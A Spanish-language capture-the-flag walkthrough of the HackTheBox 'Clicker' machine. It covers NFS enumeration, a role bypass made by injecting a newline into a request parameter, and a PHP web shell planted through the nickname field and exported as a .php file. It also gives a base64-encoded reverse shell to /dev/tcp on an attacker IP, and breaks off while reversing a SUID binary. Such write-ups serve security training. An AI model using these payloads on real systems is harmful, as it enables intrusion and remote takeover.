@@ -1,0 +1,342 @@
+I"��<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo con nmap donde encontraremos  varios puertos abiertos</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.232</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>
+<span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rpcbind</span>
+<span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">nfs</span>
+<span class="mi">34651</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">46653</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">49257</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">51567</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+<span class="mi">53719</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+</code></pre></div></div>
+
+<p>Ahora escanearemos para obtener mas informacion sobre la version  y servicio que esta corriendo</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">2049</span><span class="p">,</span><span class="mi">34651</span><span class="p">,</span><span class="mi">46653</span><span class="p">,</span><span class="mi">49257</span><span class="p">,</span><span class="mi">51567</span><span class="p">,</span><span class="mi">53719</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.232</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">ssh</span>      <span class="no">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">4</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
+</span><span class="o">|</span>   <span class="mi">256</span> <span class="mi">89</span><span class="ss">:d7</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">58</span><span class="ss">:a0:ea:a1:db:c1</span><span class="p">:</span><span class="mi">3</span><span class="n">d</span><span class="p">:</span><span class="mi">14</span><span class="ss">:ec</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">a</span><span class="p">:</span><span class="mi">92</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">b4</span><span class="ss">:da</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="ss">:af</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="ss">:bb:f0</span><span class="p">:</span><span class="mi">71</span><span class="ss">:d5</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">50</span><span class="ss">:ed:d8</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">30</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>     <span class="no">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">((</span><span class="no">Ubuntu</span><span class="p">))</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Did</span> <span class="n">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">clicker</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span>
+<span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">rpcbind</span>  <span class="mi">2</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="no">RPC</span> <span class="c1">#100000)</span>
+<span class="o">|</span> <span class="ss">rpcinfo: 
+</span><span class="o">|</span>   <span class="n">program</span> <span class="n">version</span>    <span class="n">port</span><span class="o">/</span><span class="n">proto</span>  <span class="n">service</span>
+<span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>        <span class="mi">111</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">rpcbind</span>
+<span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>        <span class="mi">111</span><span class="o">/</span><span class="n">udp</span>   <span class="n">rpcbind</span>
+<span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">3</span><span class="p">,</span><span class="mi">4</span>          <span class="mi">111</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">rpcbind</span>
+<span class="o">|</span>   <span class="mi">100000</span>  <span class="mi">3</span><span class="p">,</span><span class="mi">4</span>          <span class="mi">111</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">rpcbind</span>
+<span class="o">|</span>   <span class="mi">100003</span>  <span class="mi">3</span><span class="p">,</span><span class="mi">4</span>         <span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">nfs</span>
+<span class="o">|</span>   <span class="mi">100003</span>  <span class="mi">3</span><span class="p">,</span><span class="mi">4</span>         <span class="mi">2049</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">nfs</span>
+<span class="o">|</span>   <span class="mi">100005</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>      <span class="mi">51276</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">mountd</span>
+<span class="o">|</span>   <span class="mi">100005</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>      <span class="mi">51567</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">mountd</span>
+<span class="o">|</span>   <span class="mi">100005</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>      <span class="mi">53286</span><span class="o">/</span><span class="n">udp</span>   <span class="n">mountd</span>
+<span class="o">|</span>   <span class="mi">100005</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>      <span class="mi">57619</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">mountd</span>
+<span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>      <span class="mi">42583</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">nlockmgr</span>
+<span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>      <span class="mi">44155</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">nlockmgr</span>
+<span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>      <span class="mi">46653</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">nlockmgr</span>
+<span class="o">|</span>   <span class="mi">100021</span>  <span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>      <span class="mi">46689</span><span class="o">/</span><span class="n">udp</span>   <span class="n">nlockmgr</span>
+<span class="o">|</span>   <span class="mi">100024</span>  <span class="mi">1</span>          <span class="mi">35700</span><span class="o">/</span><span class="n">udp6</span>  <span class="n">status</span>
+<span class="o">|</span>   <span class="mi">100024</span>  <span class="mi">1</span>          <span class="mi">47291</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">status</span>
+<span class="o">|</span>   <span class="mi">100024</span>  <span class="mi">1</span>          <span class="mi">53719</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">status</span>
+<span class="o">|</span>   <span class="mi">100024</span>  <span class="mi">1</span>          <span class="mi">59549</span><span class="o">/</span><span class="n">udp</span>   <span class="n">status</span>
+<span class="o">|</span>   <span class="mi">100227</span>  <span class="mi">3</span>           <span class="mi">2049</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">nfs_acl</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">100227</span>  <span class="mi">3</span>           <span class="mi">2049</span><span class="o">/</span><span class="n">tcp6</span>  <span class="n">nfs_acl</span>
+</code></pre></div></div>
+
+<p>Viendo los resultados, en el puerto 80 nos dice que nos redirije a <strong>clicker.htb</strong> por lo que hay que agregarlo el /etc/hosts para que pueda resolver. Tambien podemos ver que tenemos el puerto 111 (rcp) y el 2049(NFS), por lo que haremos uso de <strong>showmount</strong> para ver los recursos compartidos</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">showmount</span> <span class="o">-</span><span class="n">e</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.232</span>
+</code></pre></div></div>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Export</span> <span class="n">list</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.232</span><span class="p">:</span>
+<span class="sr">/mnt/</span><span class="n">backups</span> <span class="o">*</span>
+</code></pre></div></div>
+<p>Ahora montaremos ese recursos en nuestra maquina</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mount</span> <span class="o">-</span><span class="n">t</span> <span class="n">nfs</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.232</span><span class="ss">:/</span><span class="n">mnt</span><span class="o">/</span><span class="n">backups</span> <span class="sr">/mnt/</span><span class="n">clicker</span><span class="o">/</span>
+</code></pre></div></div>
+
+<p>Encontraremos un archivo .zip que el descomprimirlo parece ser un backup del sitio web.</p>
+
+<h3 id="sitio-web-clickerhtb">Sitio web clicker.htb</h3>
+
+<p>Al explorar el sitio web, podremos ver que nos podemos registrar, iniciar sesion, y jugar. En la ventada de <strong>play</strong> podemos dar click y guardar nuestro progreso, en este punto podemos interceptar la peticion que se hace cuando guardamos nuestros progreso haciendo uso de burpsuite</p>
+
+<p><img src="/assets/img/clicker/1.png" alt="" /></p>
+
+<p>Podemos ver que se manda a llamar al archivo <strong>save_game</strong> y le manda dos parametros:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">GET</span> <span class="sr">/save_game.php?clicks=29&amp;level=0 HTTP/</span><span class="mf">1.1</span>
+</code></pre></div></div>
+<p>Asi que analizaremos ese archivo</p>
+
+<h3 id="save_gamephp">save_game.php</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">"db_utils.php"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'PLAYER'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'PLAYER'</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$args</span> <span class="o">=</span> <span class="p">[];</span>
+	<span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span> <span class="o">===</span> <span class="s1">'role'</span><span class="p">)</span> <span class="p">{</span>
+			<span class="c1">// prevent malicious users to modify role</span>
+			<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?err=Malicious activity detected!'</span><span class="p">);</span>
+			<span class="k">die</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$args</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nf">save_profile</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'PLAYER'</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">);</span>
+	<span class="c1">// update session info</span>
+	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CLICKS'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'clicks'</span><span class="p">];</span>
+	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'LEVEL'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'level'</span><span class="p">];</span>
+	<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?msg=Game has been saved!'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>
+    <p><strong>if (isset($_SESSION[‘PLAYER’]) &amp;&amp; $_SESSION[‘PLAYER’] != “”)</strong>: Se verifica la existencia la sesion llamada PLAYER ademas de verificar si su contenido no esta vacio, seguramente para saber si el jugador inicio sesion</p>
+  </li>
+  <li>
+    <p><strong>foreach($_GET as $key=&gt;$value)</strong>: Se usar foreach para recorrer todos los parametros de la peticion que se hace por GET, en nuestro caso, los clicks y el nivel</p>
+  </li>
+  <li>
+    <p><strong>if (strtolower($key) === ‘role’)</strong>: Si cuando recorre los parametros encuentra uno con nombre “role” se redirige el index.php</p>
+  </li>
+</ul>
+
+<p>Y lo demas es para guardar el valor de los parametros y actualizar los valores de la sesion PLAYER</p>
+
+<p>Sabiendo esto, debemos de encontrar una forma de hacernos <strong>Admin</strong></p>
+
+<h2 id="crlf-injection">CRLF Injection</h2>
+
+<p>Las siglas CRLF son de retorno de carro (CR) y salto de linea (LF). Estos caracteres que sin “invisibles” se usan para indicar cuando inicar y cuando termina un encabezados.</p>
+
+<p>CRLF injection es una vulnerabilidad que permite inyectar estos caracteres para manipular los encabezados, asi engañando a la aplicacion web e indicarle que un encabezado o valor de estos, ha terminado o comenzado.</p>
+
+<p>Sabiendo esto, en la peticion web podemos agregar el caracter <strong>%0d</strong> (retorno de carro) para indicarle el comienzo de un nuevo parametro en esa peticion, por lo que quedaria asi:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">GET</span> <span class="sr">/save_game.php?clicks=29&amp;level=0&amp;role%0a=Admin HTTP/</span><span class="mf">1.1</span>
+</code></pre></div></div>
+
+<p>En burpsuite en la pestaña proxy modificamos la peticion y le damos <strong>forward</strong> , cerramos y volvemos  a iniciar sesion y ya seremos admin</p>
+
+<p><img src="/assets/img/clicker/2.png" alt="" /></p>
+
+<p>Una vez que seamos admin, veremos que podemos exportar los resultados en formato txt, json y html y nos genera una ruta como esta: <strong>exports/top_players_fl8moszw.txt</strong></p>
+
+<p>Si vemos le peticion, podemos ver que manda a llamar el archivo <strong>exports.php</strong> y tambien le manda la extension como parametro</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">POST</span> <span class="sr">/export.php HTTP/</span><span class="mf">1.1</span>
+<span class="no">Host</span><span class="p">:</span> <span class="n">clicker</span><span class="p">.</span><span class="nf">htb</span>
+<span class="no">User</span><span class="o">-</span><span class="no">Agent</span><span class="p">:</span> <span class="no">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="no">X11</span><span class="p">;</span> <span class="no">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">121.0</span><span class="p">)</span> <span class="no">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="no">Firefox</span><span class="o">/</span><span class="mf">121.0</span>
+<span class="no">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*</span><span class="sr">/*;q=0.8
+Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">31</span>
+<span class="no">Origin</span><span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">clicker</span><span class="p">.</span><span class="nf">htb</span>
+<span class="no">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="no">Referer</span><span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">clicker</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span><span class="n">admin</span><span class="p">.</span><span class="nf">php?</span><span class="n">msg</span><span class="o">=</span><span class="no">Data</span><span class="o">%</span><span class="mi">20</span><span class="n">has</span><span class="o">%</span><span class="mi">20</span><span class="n">been</span><span class="o">%</span><span class="mi">20</span><span class="n">saved</span><span class="o">%</span><span class="mi">20</span><span class="k">in</span><span class="o">%</span><span class="mi">20</span><span class="n">exports</span><span class="o">/</span><span class="n">top_players_fl8moszw</span><span class="p">.</span><span class="nf">txt</span>
+<span class="no">Cookie</span><span class="p">:</span> <span class="no">PHPSESSID</span><span class="o">=</span><span class="n">f131nr6f06m2ocr5i3ap1gbt3h</span>
+<span class="no">Upgrade</span><span class="o">-</span><span class="no">Insecure</span><span class="o">-</span><span class="no">Requests</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="n">threshold</span><span class="o">=</span><span class="mi">1000000</span><span class="o">&amp;</span><span class="n">extension</span><span class="o">=</span><span class="n">txt</span>
+</code></pre></div></div>
+
+<p>Sabiendo esto, podriamos intentar cambiar la extension a PHP para intentar ejecutar codigo PHP, pero antes, en el archivo <strong>exports.php</strong> podemos ver que cuando se selecciona uno de los formatos para exportar, existe otro parametro con el nombre de <strong>nickname</strong> (ejemplo del codigo del formato TXT)</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"extension"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"txt"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$s</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Nickname: "</span><span class="mf">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">"nickname"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">" Clicks: "</span> <span class="mf">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">"clicks"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">" Level: "</span> <span class="mf">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">"level"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$player</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$s</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Nickname: "</span><span class="mf">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">"nickname"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">" Clicks: "</span> <span class="mf">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">"clicks"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">" Level: "</span> <span class="mf">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">"level"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Asi mismo en el archivo <strong>authenticate.php</strong> tambien podemos ver la existencia de ese parametro:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nf">check_auth</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"PLAYER"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">];</span>
+		<span class="nv">$profile</span> <span class="o">=</span> <span class="nf">load_profile</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]);</span>
+		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"NICKNAME"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">"nickname"</span><span class="p">];</span>
+		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"ROLE"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">"role"</span><span class="p">];</span>
+		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"CLICKS"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">"clicks"</span><span class="p">];</span>
+		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"LEVEL"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">"level"</span><span class="p">];</span>
+		<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Haremos lo mismo que en la parte de CRLF injection, pero agregando ese nuevo parametro, por lo que la peticion quedaria asi:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">GET</span> <span class="sr">/save_game.php?clicks=29&amp;level=0&amp;nickname=&lt;%3fphp+system($_GET['comando'])+%3f&gt; HTTP/</span><span class="mf">1.1</span>
+</code></pre></div></div>
+<p>Y en la parte para exportar el resultado volvemos a interceptar la peticion y le cambiamos el formato a PHP</p>
+
+<p>Podemos ver que se puso en formato PHP</p>
+
+<p><img src="/assets/img/clicker/3.png" alt="" /></p>
+
+<p>Y al ingresar a la URL, veremos que hecmos conseguido RCE:</p>
+
+<p><img src="/assets/img/clicker/4.png" alt="" /></p>
+
+<p>Ahora solo queda enviarnos  una reverse shell</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s2">"sh -i &gt;&amp; /dev/tcp/10.10.15.96/443 0&gt;&amp;1"</span> <span class="o">|</span> <span class="n">base64</span>
+</code></pre></div></div>
+
+<p>Y en la URL ponemos: ?comando=echo “<base64>" | base64 -d | bash</base64></p>
+
+<p>Y nos deberia de llegar</p>
+
+<p><img src="/assets/img/clicker/5.png" alt="" /></p>
+
+<h2 id="www-data---jack">www-data -&gt; jack</h2>
+
+<p>Si buscamos por binarios SUID, podemos ver el <strong>/opt/manage/execute_query</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/nu</span><span class="n">ll</span>
+<span class="sr">/opt/m</span><span class="n">anage</span><span class="o">/</span><span class="n">execute_query</span>
+</code></pre></div></div>
+
+<p>Al hacerle un <strong>file</strong> podemos ver que es un binario ELF:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">execute_query: </span><span class="n">setuid</span><span class="p">,</span> <span class="n">setgid</span> <span class="no">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="no">LSB</span> <span class="n">pie</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="no">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="sr">/lib64/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="nf">so</span><span class="o">.</span><span class="mi">2</span><span class="p">,</span> <span class="no">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="n">cad57695aba64e8b4f4274878882ead34f2b2d57</span><span class="p">,</span> <span class="k">for</span> <span class="no">GNU</span><span class="o">/</span><span class="no">Linux</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">not</span> <span class="n">stripped</span>
+</code></pre></div></div>
+<p>Tambien existe un txt que dice:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Web application Management
+
+Use the binary to execute the following task:
+	- 1: Creates the database structure and adds user admin
+	- 2: Creates fake players (better not tell anyone)
+	- 3: Resets the admin password
+	- 4: Deletes all users except the admin
+</code></pre></div></div>
+
+<h3 id="analisis-del-binario">Analisis del binario</h3>
+
+<p>En mi caso suelo usar binaryninja</p>
+
+<p>Primero el binario verifica si existe un argumento cuando fue ejecutado</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="n">s</span><span class="o">&lt;=</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">str</span><span class="o">:</span> <span class="s">"ERROR: not enough arguments"</span><span class="p">)</span>
+<span class="n">rax_2</span> <span class="o">=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p>Este argumento se almacena en <strong>rax_6</strong> cuando se usa la funcion <strong>atoi</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int32_t</span> <span class="n">rax_6</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="o">:</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>Despues usando <strong>calloc()</strong> reverva en tiempo de ejecucion 20 bytes de memoria en el heap, esto devuelve un puntero al espacio que se reservó, en este caso  se almacena en <strong>rax_7</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span><span class="o">*</span> <span class="n">rax_7</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">n</span><span class="o">:</span> <span class="mh">0x14</span><span class="p">,</span> <span class="n">elem_size</span><span class="o">:</span> <span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Posteriormente se entra en un switch-case de 5 opciones (contando el case por default)</p>
+
+<p><img src="/assets/img/clicker/8.png" alt="" /></p>
+
+<p>En cada case (sin contar el 0), se hace uso de la funcion <strong>strncpy</strong> para copiar la cadena del segundo parametro al espacio al que apunta <strong>rax_7</strong>, en el codigo, los case 1 al 4, copian una cadena que corresponde a un archivo sql</p>
+
+<p>Sin embargo, en el case por default se usa <strong>strncpy</strong> para copiar el segundo argumento del programa (<strong>argv[2]</strong>) en el espacio al que apunta <strong>rax_7</strong></p>
+
+<p>Un poco mas abajo, se hace un if para verificar si <strong>rax_6</strong> es una del las opciones del case:</p>
+
